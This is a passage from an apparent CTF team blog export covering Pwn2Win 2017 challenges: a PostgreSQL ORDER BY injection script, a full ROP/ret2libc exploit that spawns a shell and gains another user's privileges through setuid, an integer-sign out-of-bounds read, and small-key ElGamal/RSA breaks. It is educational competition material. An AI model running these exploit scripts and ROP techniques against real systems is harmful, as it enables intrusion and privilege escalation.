1 offset &#123;&#125;)) as int)', true, false,'')),1)\"for x in xrange(0,6): #print x data['order'] = query.format(x) print data['order'] r = requests.post(host, data=data) print re.findall(r'&amp;quot;([A-Za-z0-9_\\-&#123;&#125;,]+)&amp;quot;', r.text)data['order'] = queryflag.format(0)print data['order']r = requests.post(host,data=data)print re.findall(r'&amp;quot;([A-Za-z0-9_\\-&#123;&#125;]+)&amp;quot;', r.text) Now running the script: $ python HQLI.py array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 0)) as int)', true, false,'')),1) [u'secret,flag'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 1)) as int)', true, false,'')),1) [u'id,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 2)) as int)', true, false,'')),1) [u'age,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 3)) as int)', true, false,'')),1) [u'crime,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 4)) as int)', true, false,'')),1) [u'last_location,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT column_name || CHR(44) || table_name FROM information_schema.columns c limit 1 offset 5)) as int)', true, false,'')),1) [u'name,criminal'] array_upper(xpath ('row', query_to_xml ('select cast(pg_ls_dir((SELECT secret FROM flag c limit 1 offset 0)) as int)', true, false,'')),1) [u'CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}']","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"},{"name":"sqli","slug":"sqli","permalink":"https://teamrocketist.github.io/tags/sqli/"},{"name":"hqli","slug":"hqli","permalink":"https://teamrocketist.github.io/tags/hqli/"},{"name":"xmlqueries","slug":"xmlqueries","permalink":"https://teamrocketist.github.io/tags/xmlqueries/"},{"name":"orderby","slug":"orderby","permalink":"https://teamrocketist.github.io/tags/orderby/"}]},{"title":"[Pwn] Pwn2Win - Wrong User","slug":"Pwn-Pwn2Win-Wrong-User","date":"2017-10-23T08:31:07.000Z","updated":"2018-11-06T04:27:09.706Z","comments":true,"path":"2017/10/23/Pwn-Pwn2Win-Wrong-User/","link":"","permalink":"https://teamrocketist.github.io/2017/10/23/Pwn-Pwn2Win-Wrong-User/","excerpt":"","text":"Wrong UserMolly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that you are also capable of invading such system and therefore she left a secret message to you. Can you get such message? Maybe you get troubles to get access with the correct user.Server: nc 10.133.70.1 6666https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gzhttps://static.pwn2win.party/wronguser_1e8787242eb826005729b0ba17a925b0782be65190f18a1b8dc4e57756c4e3c4.tar.gzId: wrong_userTotal solves: 8Score: 373Categories: Exploitation Using radare2 to disassembly the binary:We have fgets with a very large size 0x400, it reads from the STDIN so we can control what to put in the buffer it’s obvious to see that we have a buffer overflow if we check what kind of protections with checksec:No stack canary protection, but NX is enabled (Non-Executable Stack) once again we have to use Return Oriented Programming (ROP), the challenge provided the libc.so so we can use to calculate the offsets. The steps to solve are: 1231 - Overflow the Buffer2 - ROP chain to leak libc addresses and return to main3 - Overflow the Buffer again and build a ROP chain to call system(&apos;/bin/sh&apos;) Overflow the BufferWell this always the same first we can create a pattern with metasploit: 123456789101112131415$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab$ gdb ./wrongpwndbg&gt; b *0x400781Breakpoint 1 at 0x400781pwndbg&gt; rStarting program: /home/user/ctf/wrong Hello! What is your name?Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbNice to meet you Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5AbBreakpoint *0x400781pwndbg&gt; x $rsp0x7fffffffdea8: 0x62413362 Now that we got the part of the string pattern that we got from the RSP register we can calculate its offset once again using metasploit: 12$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413362[*] Exact match at offset 40 Finally the padding we require is 40… ROP chain to leak libc addresses and return to mainWe need to leak a libc address we can do this with puts or printf they are both present in the binary, because of this they will be also be in the GOT (Global Offset Table) as we can check their location addresses using objdump -R ./wrong: 1234567891011121314151617$ objdump -R ./wrong./wrong: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 0000000000600b58 R_X86_64_GLOB_DAT __gmon_start__0000000000600bd0 R_X86_64_COPY stdout@@GLIBC_2.2.50000000000600bd8 R_X86_64_COPY stdin@@GLIBC_2.2.50000000000600b78 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.50000000000600b80 R_X86_64_JUMP_SLOT getuid@GLIBC_2.2.50000000000600b88 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.50000000000600b90 R_X86_64_JUMP_SLOT __libc_start_main@GLIBC_2.2.50000000000600b98 R_X86_64_JUMP_SLOT fgets@GLIBC_2.2.50000000000600ba0 R_X86_64_JUMP_SLOT __gmon_start__0000000000600ba8 R_X86_64_JUMP_SLOT fflush@GLIBC_2.2.50000000000600bb0 R_X86_64_JUMP_SLOT setuid@GLIBC_2.2.5 We want to get the address that’s stored in the GOT of puts with it we can calculate the offsets to another useful libc functions like system and the offset to the string /bin/sh, to call a function within ROP we need the PLT address we can get them using objdump -dj.plt ./wrong: 12345678910111213141516$ objdump -dj.plt ./wrong./wrong: file format elf64-x86-64Disassembly of section .plt:0000000000400560 &lt;.plt&gt;0000000000400570 &lt;puts@plt&gt;0000000000400580 &lt;getuid@plt&gt;0000000000400590 &lt;printf@plt&gt;00000000004005a0 &lt;__libc_start_main@plt&gt;00000000004005b0 &lt;fgets@plt&gt;00000000004005c0 &lt;__gmon_start__@plt&gt;00000000004005d0 &lt;fflush@plt&gt;00000000004005e0 &lt;setuid@plt&gt; Since this is a 64bit binary we need to store the function arguments in registers instead of putting them in the stack, we can do this using ROPGadgets, in x64 the first six parameters are saved in RDI, RSI, RDX, RCX, R8 and R9, if there are more parameters will be saved on the stack. Since puts only has 1 argument we just need a Gadget that pop an address from the stack into the RDI register, ROPGadget can help us finding such a gadget: 1234567891011121314$ ROPgadget --binary ./wrong --only &quot;pop|ret&quot;Gadgets information============================================================0x00000000004007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop r14 ; pop r15 ; ret0x00000000004007f2 : pop r15 ; ret0x00000000004007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400650 : pop rbp ; ret0x00000000004007f3 : pop rdi ; ret0x00000000004007f1 : pop rsi ; pop r15 ; ret0x00000000004007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400559 : ret The 0x00000000004007f3 : pop rdi ; ret gadget is the one we need, now we just need the address from main so after we run our gadget we can return back to main:Now that we have everything we need we can start building our ropchain: Overflow the Buffer again and build a ROP chain to call system(‘/bin/sh’)Now we have everything we need to calculate other libc addresses we need help from libc.so.6 file they gave us pwntools can help us to get the offsets in a easier way: 12345678910111213141516171819202122232425262728293031323334BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')#time.sleep(1)r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)#PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS -libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETSYSTEM = LIBCBASE + libc.symbols['system']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH) Now that we have the addresses we need we can start again to build a new ropchain:Now the full exploit could be written as follows: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *import timedef getConn(): return process('./wrong', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('10.133.70.1', 6666)local = Truer = getConn()#gdb.attach(r, '''# b *0x0040076c# c''')# BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')#time.sleep(1)r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)#PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS -libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETSYSTEM = LIBCBASE + libc.symbols['system']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"SYSTEM LIBC 0x%x\" % SYSTEM)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r.sendline(PADDING+ropchain)r.interactive() If you run it you will get a shell to the server:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253python wrong_part1.py [+] Opening connection to 10.133.70.1 on port 6666: Done/usr/local/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module hashlib was already imported from /usr/lib/python2.7/hashlib.pyc, but /usr/local/lib/python2.7/dist-packages is being added to sys.path import pkg_resources/usr/local/lib/python2.7/dist-packages/unicorn/unicorn.py:6: UserWarning: Module six was already imported from /home/evilgod/.local/lib/python2.7/site-packages/six.pyc, but /usr/lib/python2.7/dist-packages is being added to sys.path import pkg_resources[*] '/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/wrong' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)[*] '/home/evilgod/Documents/Hacking/ctf/pwn2win/exploitation/WrongUser/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledHello! What is your name?Nice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@Hello! What is your name?[*] LEAKED PUTS LIBC 0x7fd320e62690[*] SYSTEM LIBC 0x7fd320e38390[*] LIBCBASE LIBC 0x7fd320df3000[*] BINSH ADDRESS 0x7fd320f7fd17[*] Switching to interactive modeNice to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@$iduid=1001(wrong-user) gid=1001(wrong-user) groups=1001(wrong-user)$ cd home$ lscasemollyubuntuwrong-user$ cd molly$ lsflag.txtwrong$ cat flag.txtcat: flag.txt: Permission denied$ ls -ltatotal 13drwxr-xr-x 6 root root 6 Oct 21 10:25 ..drwxr-xr-x 2 root molly 7 Aug 31 22:37 .-rw-r----- 1 molly molly 29 Aug 31 22:37 flag.txt-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong-rw-r--r-- 1 root molly 220 Aug 31 22:24 .bash_logout-rw-r--r-- 1 root molly 3771 Aug 31 22:24 .bashrc-rw-r--r-- 1 root molly 655 Aug 31 22:24 .profile So what’s wrong here? We don’t have access to the flag.txt, and happens we got access to the wrong user, there are some problems here, one of them is that in the beginning of the program we can see it’s being run setuid(getuid()) : This will drop permissions from the as we can see when we did ls -lta the executable has the setuid enabled:1-rwsr-x--- 1 molly wrong-user 7704 Aug 31 22:27 wrong Translating this a little bit:12345678910111213OWNER: Group-rws r-x ||||---&gt; Execute and setuid bit (both enabled). ||||||---&gt; Write Permissions(enabled) || \\--&gt; Executable permissions (Enabled)| \\---&gt; Read permissions(enabled) | \\--&gt; Write Permissions (Disabled) \\---&gt; If it&apos;s a directory(disabled) \\---&gt; Read Permissions (Enabled)World:---||||| \\---&gt; Executable permissions (Disabled)| \\---&gt; Write Permissions (Disabled) \\---&gt; Read Permissions (Disabled) When the setuid is enabled the process will run with owner permissions, but there are some issues that are dropping privileges, the setuid(getuid()) is one of them this is simple to solve we just need to create a ropchain that calls setuid(molly_uid) first we need to find molly’s uid this is easy we can check /etc/passwd : 1234567891011121314151617181920212223242526272829303132333435$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsesshd:x:110:65534::/var/run/sshd:/usr/sbin/nologinpollinate:x:111:1::/var/cache/pollinate:/bin/falseubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bashwrong-user:x:1001:1001:,,,:/home/wrong-user:/bin/bashmolly:x:1337:1337:,,,:/home/molly:/bin/bashcase:x:1002:1002:,,,:/home/case:/bin/bash Molly’s uid is 1337 writing a ropchain is trivial, we can do it like this: 12345SETUID = LIBCBASE + libc.symbols['setuid']ropchain += p64(POPRET) # POP RDI RETropchain += p64(1337) # 1337 ARG[1]ropchain += p64(SETUID) # SETUID function \"call\" Now we ran into another problem, system will drop privileges we need to use an alternative exec is perfect for this, but we can’t just do execv(‘/bin/bash’,0x0) if we read the man documentation of /bin/bash : The explanation from man pages is very clear, we need to provide -p as an argument to /bin/bash, we could do it with a ROPCHAIN but is harder to to find the right gadgets to put more than 1 arguments, since we have local access to the server we can just write a file into /tmp/exp and then execute it with execv(“/tmp/exp”,0x0): 12#!/bin/bash -p/bin/bash -p I had some problems to use vim and nano (python interactive shell didn’t work very well with them), so I had to write to script in my machine and convert it into base64, then using echo I wrote the file and decoded it into /tmp/exp: My machine 12345$ cat shell #!/bin/bash -p/bin/bash -p$ cat shell | base64IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg== Server’s machine 12345$ echo 'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==' | base64 -d#!/bin/bash -p/bin/bash -p$ echo 'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==' | base64 -d &gt; /tmp/exp$ chmod +x /tmp/exp Now we just need to build a ropchain that runs execv(‘/tmp/exp’, 0x0) we can’t use something like we use to system we need the address where /tmp/exp is stored, the trick here is to put this string on the stack and get it’s address from the register RSP, we need to find a gadget like this: 12MOV RDI, RSP CALL RAX First we need to store the address from execv into RAX, and we need to put the string /tmp/exp into the stack, so when we MOV RDI, RSP, we are going to move the address of the the string into RDI and then CALL RAX. These special gadget is not found in ./wrong binary we actually needed to search it in the libc binary itself! you can use RopGadgets to do it: We can build an ropchain that does that like this:1234567MOVCALL_OFFSET = 0x12b845POPRET_OFFSET = 0x33544ropchain += p64(LIBCBASE + POPRET_OFFSET) # POP RAX; RETropchain += p64(EXECV) # \"exec\"ropchain += p64(LIBCBASE + MOVCALL_OFFSET) # MOV RDI, RSP; CALL RAXropchain += \"/tmp/exp\\x00\" The full exploit is: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *import timedef getConn(): return process('./wrong', env = &#123;\"LD_PRELOAD\":'./libc.so.6'&#125;) if local else remote('10.133.70.1', 6666)local = Falser = getConn() BINSH_OFFSET = 0x18cd17 # strings -a -t x libc.so.6 | grep '/bin/sh'binary = ELF('./wrong')libc = ELF('./libc.so.6')PADDING = 'A'*40POPRET = 0x4007f3POPRET2 = 0x4007f1POPRET3 = 0x00000000004007f1PUTSPLT = binary.plt['puts'] #0x000000000040056cPUTSGOT = binary.got['puts']MAIN = 0x4006e6ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" print r.recvuntil('Hello! What is your name?\\n')r.sendline(PADDING+ropchain)print r.recv(len('Nice to meet you ')+len(PADDING)+3)PUTS = u64(r.recv(6).ljust(8, '\\x00'))print r.recvuntil('Hello! What is your name?\\n')LIBCBASE = PUTS-libc.symbols['puts']BINSH = LIBCBASE + BINSH_OFFSETEXECV = LIBCBASE + libc.symbols['execv']SETUID = LIBCBASE + libc.symbols['setuid']log.info(\"LEAKED PUTS LIBC 0x%x\" % PUTS)log.info(\"EXECV LIBC 0x%x\" % EXECV)log.info(\"LIBCBASE LIBC 0x%x\" % LIBCBASE)log.info(\"BINSH ADDRESS 0x%x\" % BINSH)log.info(\"SETUID ADDRESS 0x%x\" % SETUID)MOVCALL_OFFSET = 0x12b845POPRET_OFFSET = 0x33544ropchain = ''ropchain += p64(POPRET) # POP RDI RETropchain += p64(1337) # 1337 ARG[1]ropchain += p64(SETUID) # SETUID function \"call\"ropchain += p64(LIBCBASE + POPRET_OFFSET) # POP RAX; RETropchain += p64(EXECV) # \"exec\"ropchain += p64(LIBCBASE + MOVCALL_OFFSET) # MOV RDI RSP; CALL RAXropchain += \"/tmp/exp\\x00\" ropchain += p64(MAIN) # SYSTEM function \"call\"r.sendline(PADDING+ropchain)r.interactive() Now if we run it we can see we got the euid from molly and because of that we can read the flag.txt : 123456$iduid=1001(wrong-user) gid=1001(wrong-user) euid=1337(molly) groups=1001(wrong-user)$ ls /home/molly/flag.txt/home/molly/flag.txt$ cat /home/molly/flag.txtCTF-BR&#123;!!two_steps_pwnage!!&#125; I want to thank the organizers of this CTF for letting me getting access to the VPN to finish this challenge.","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"}]},{"title":"[Pwn] Pwn2Win - Hidden Program (Warmup)","slug":"Pwn-Pwn2Win-Hidden-Program-Warmup","date":"2017-10-22T20:42:32.000Z","updated":"2018-11-06T04:25:16.671Z","comments":true,"path":"2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/","excerpt":"","text":"Hidden Program (Warmup)Molly found this program hidden on her chip, can you help her to understand it?Link:https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gzMirror:https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gzServer: nc 200.136.213.126 1988Id: hidden_programTotal solves: 145Score: 82Categories: Exploitation After extracting we have a .c file: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;typedef struct&#123; char flag[SHRT_MAX+1]; char in[SHRT_MAX+1]; char sub[SHRT_MAX+1]; int n;&#125; player;player p1;void main()&#123; FILE *fp = fopen(\"/home/user/ctf/flag\",\"r\"); memset(p1.flag,0,sizeof(p1.flag)); fscanf(fp,\"%[^\\n]\",p1.flag); fclose(fp); printf(\"%s\\n\", p1.in); while(1) &#123; printf(\"Insert a short integer: \"); fflush(stdout); scanf(\" %d\", &amp;p1.n); if(p1.n&gt;SHRT_MAX) printf(\"Invalid number\\n\\n\"); else break; &#125; p1.n = (short)abs((short)p1.n); printf(\"Insert a string: \"); fflush(stdout); scanf(\"%10000s\",p1.in); printf(\"Insert another string: \"); fflush(stdout); scanf(\"%10000s\",p1.sub); if(strcmp(&amp;p1.in[p1.n],p1.sub)==0) printf(\"Congratulations!! YOU WIN!!\\n\"); else printf(\"\\tYou lost!!!\\n\\ In the string %s the substring in the position %d is %s\\n\\ Try again...\\n\", p1.in, p1.n, &amp;p1.in[p1.n]); fflush(stdout);&#125; Resuming what this program is doing, first it opens the flag file from the server and stores it in the c struct field p1.flag:1234FILE *fp = fopen(\"/home/user/ctf/flag\",\"r\");memset(p1.flag,0,sizeof(p1.flag));fscanf(fp,\"%[^\\n]\",p1.flag);fclose(fp); Then reads from the stdin using scanf for a short int (stores it in p1.n= and two strings (stores them in p1.in and p1.sub). 123456789101112131415while(1) &#123; printf(\"Insert a short integer: \"); fflush(stdout); scanf(\" %d\", &amp;p1.n); if(p1.n&gt;SHRT_MAX) printf(\"Invalid number\\n\\n\"); else break; &#125;p1.n = (short)abs((short)p1.n);printf(\"Insert a string: \");fflush(stdout);scanf(\"%10000s\",p1.in);printf(\"Insert another string: \");fflush(stdout);scanf(\"%10000s\",p1.sub); In the end we have this check: 123456if(strcmp(&amp;p1.in[p1.n],p1.sub)==0) printf(\"Congratulations!! YOU WIN!!\\n\");else printf(\"\\tYou lost!!!\\n\\ In the string %s the substring in the position %d is %s\\n\\ Try again...\\n\", p1.in, p1.n, &amp;p1.in[p1.n]); Well the strcmp does a compares between p1.n[p1.n] character and the string p1.sub, if they are equal it prints out the string “Congratulations!! YOU WIN!!\\n”, well we can see that making strcmp matching this will lead to nothing just a useless string, what we are interested what comes after else… Since we can control the index with p1.n, we can actually make this printf to print the flag which is p1.flag we just need to get the offset between p1.in and p1.flag we can get this easily with gdb: First lets compile the file with gcc: 1234$ gcc hiddenprogram.c -ggdb -o lol hiddenprogram.c: In function ‘main’:hiddenprogram.c:31:19: warning: implicit declaration of function ‘abs’ [-Wimplicit-function-declaration] p1.n = (short)abs((short)p1.n); The –gdb is very useful gives us alot of debugging information with gdb, we can view where we are located in the source code, breakpoints indicating the line numbers and even print variables by just using its names much easier than looking at assembly and print using addresses right? After using gdb we know where each variable from the struct begins doing a simple subtraction we can get the offset we need to print the flag: 12$ python -c \"print 0x5555557550a0-0x55555575d0a0\"-32768 The real problem in all this is that we need a negative value, and there is a ABS function making us fail: 1p1.n = (short)abs((short)p1.n); For some reason actually after the negative number when &gt;= -32768 the abs won’t do anything (I don’t really know why maybe its because the short cast? but if you know why this happens please tweet me or make a post in the comments)! this is perfect that’s what we really needed, you can see how the abs is doing with this program: 12345678#include&lt;stdio.h&gt;int main() &#123; int below=(short)abs((short)-32767); int value_we_need=(short)abs((short)-32768); int higher=(short)abs((short)-32769); printf(\"%d %d %d\\n\", below,value_we_need,higher);&#125; Running it:1234567$ gcc wtf.c -o wtfwtf.c: In function ‘main’:wtf.c:4:21: warning: implicit declaration of function ‘abs’ [-Wimplicit-function-declaration] int below=(short)abs((short)-32767); ^~~$ ./wtf 32767 -32768 32767 Now applying this with the service we get the flag by injection -32768: 12345678nc 200.136.213.126 1988 Insert a short integer: -32768Insert a string: 11Insert another string: 1 You lost!!! In the string 1 the substring in the position -32768 is CTF-BR&#123;Th1s_1S_4_50_5Imp13_C_exp1017_&#125; Try again...","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Integer Overflow","slug":"Pwn/x64/Integer-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Integer-Overflow/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"index","slug":"index","permalink":"https://teamrocketist.github.io/tags/index/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"}]},{"title":"Crypto-Pwn2Win-2017-Asymmetric-Encryption","slug":"Crypto-Pwn2Win-2017-Asymmetric-Encryption","date":"2017-10-22T20:07:58.000Z","updated":"2019-04-10T03:55:45.077Z","comments":true,"path":"2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/","excerpt":"","text":"Asymmetric EncryptionBloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You may be able to exploit such communications, but first you should be able to recognize the used asymmetric algorithms.Server: nc 200.136.213.110 7777 We fire netcat and we obtain the following: 12345q = 896922063827g = 12424931089h = 574559267769enc(a) = (453104394915, 390471080026)enc(3*a + 32)? We notice that the cryptosystem here must be ElGamal.One can obtain the encryption of 3a, because ElGamal is homomorphic in relation to the multiplication, i.e. E(m1)E(m2) = E(m1*m2). But, it is not in relation to the addition. Therefore, it is required to find the private key x such that g^x mod q = h. As the prime q only has 40 bits, it is easy to find out with the baby step giant step meet in the middle attack.We used https://github.com/viralpoetry/Baby-step-giant-step to compute the discrete log. We obtain x = 202922528794. 1234567891011121314151617&gt;&gt;&gt; x = 202922528794&gt;&gt;&gt; q = 896922063827&gt;&gt;&gt; h = 574559267769&gt;&gt;&gt; g = 12424931089# we have now to find a&gt;&gt;&gt; enc = (453104394915, 390471080026)&gt;&gt;&gt; s = pow(enc[0], x, q)&gt;&gt;&gt; sinv = modinv(s, q)# (modinv from https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)&gt;&gt;&gt; a = enc[1] * sinv % q&gt;&gt;&gt; a108768066438L&gt;&gt;&gt; to_encrypt = 3*a + 32&gt;&gt;&gt; r = 5 # we chose a small random number for the encryption. it could be whatever you wanted &lt; q&gt;&gt;&gt; result = (pow(g, r, q), to_encrypt * pow(h, r, q) % q)&gt;&gt;&gt; result(801172058328L, 410122112192L) Easy. We have our first correct answer. 1234567891011q = 896922063827g = 12424931089h = 574559267769enc(a) = (453104394915, 390471080026)enc(3*a + 32)?(801172058328, 410122112192)Correct! Next...n = 659381354716006369742363e = 65537enc(a) = 554863447144015806910906enc(a^5 + 2*a + 41)? Now, this is clearly RSA. The modulus is small. Let’s use yafu to compute the factors of 659381354716006369742363.We obtain p = 864367132729 and q = 762848712947. 12345678910&gt;&gt;&gt; p = 864367132729&gt;&gt;&gt; q = 762848712947&gt;&gt;&gt; n = p * q&gt;&gt;&gt; e = 